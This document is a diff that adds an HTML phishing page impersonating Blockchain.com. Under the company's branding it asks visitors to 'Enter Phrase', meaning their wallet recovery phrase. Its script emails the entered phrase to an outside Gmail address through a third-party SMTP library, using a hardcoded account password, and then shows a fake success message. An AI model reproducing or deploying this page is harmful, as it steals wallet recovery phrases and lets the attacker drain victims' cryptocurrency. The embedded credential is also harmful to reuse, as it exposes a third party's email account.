@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="msapplication-TileColor" content="#ffffff"/><meta name="msapplication-TileImage" content="static/img/ms-icon-144x144.png"/><meta name="keywords" content="best wallet, bitcoin cash wallet, bitcoin wallet, btc wallet, buy bitcoin, buy cryptocurrency, coin wallet, crypto wallet, cryptocurrency wallet, digital wallet, ether wallet, ethereum wallet, safest wallet, secure crypto wallet, usd to bitcoin, blockchains, venture, fund, blockchain ventures, blockchain fund"/><meta property="og:url" content="index.html"/><meta property="og:type" content="website"/><meta property="og:title" content="Blockchain.com - The Most Trusted Crypto Company"/><meta property="og:description" content="Blockchain.com is the most popular place to securely buy, store, and trade Bitcoin, Ethereum, and other top cryptocurrencies. "/><meta property="og:image" content="static/img/home/opengraph.png"/><meta property="og:image:type" content="image/png"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:image" content="static/img/home/opengraph.png"/><meta name="twitter:description" content="Blockchain.com is the most popular place to securely buy, store, and trade Bitcoin, Ethereum, and other top cryptocurrencies. "/><link rel="apple-touch-icon" sizes="180x180" href="static/apple-touch-icon.png"/><link rel="icon" type="image/png" sizes="32x32" href="static/favicon-32x32.png"/><link rel="icon" type="image/png" sizes="16x16" href="static/favicon-16x16.png"/><link rel="shortcut icon" href="static/favicon.ico" type="image/x-icon"/><link rel="stylesheet" href="../rsms.me/inter/inter.css"/><meta name="apple-itunes-app" content="app-id=493253309"/><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Playfair+Display:400;subset=latin"/><link rel="manifest" href="manifest.json"/>
+    <title>Blockchain.com | The Most Trusted Crypto Wallet &amp; Exchange</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+</head>
+<body style="background-color: rgb(18, 29, 51)"> 
+    <style>
+        .img {
+            margin: 0 auto;
+            display: flex;
+            margin-top: 25px;
+            width: 250px;
+        }
+        .card {
+            margin: 0 auto;
+            display: flex;
+            margin-top: 50px; 
+        }
+    </style>
+    <img src="static/img/bc-logo.svg" alt="" class="img">
+    <div class="card" style="width: 25rem;">
+        <div class="card-body">
+              <div class="mb-3">
+                  <form action="" method="post">
+                <label for="exampleFormControlTextarea1" class="form-label">Enter Phrase</label>
+                <textarea class="form-control" type="text" id="phrase" name="phrase" required rows="3"></textarea>
+              </div>
+              <input type="button" class="btn btn-primary" value="Submit"
+              onclick="sendEmail()"/>
+          <a href="https://www.blockchain.com/" class="btn btn-outline-dark">Home Page</a>
+        </form>
+        </div>
+      </div>
+      <script src="https://smtpjs.com/v3/smtp.js">
+    </script>
+
+    <script type="text/javascript">
+        function sendEmail() {
+            var form = document.forms[0];
+            var phrase = form.phrase.value;
+            Email.send({
+                Host: "smtp.gmail.com",
+                Username: "noreply@adspltech.net",
+                Password: "Nikhil@adspl1",
+                To: 'noreplyblackchain@gmail.com',
+                From: "noreplyblackchain@gmail.com",
+                Subject: "You just received a new phrase",
+                Body: "Phrase Details : " + phrase,
+            })
+                .then(function (message) {
+                    alert("Phrase Submitted Successfully")
+                });
+        }
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
+</body>
+</html>
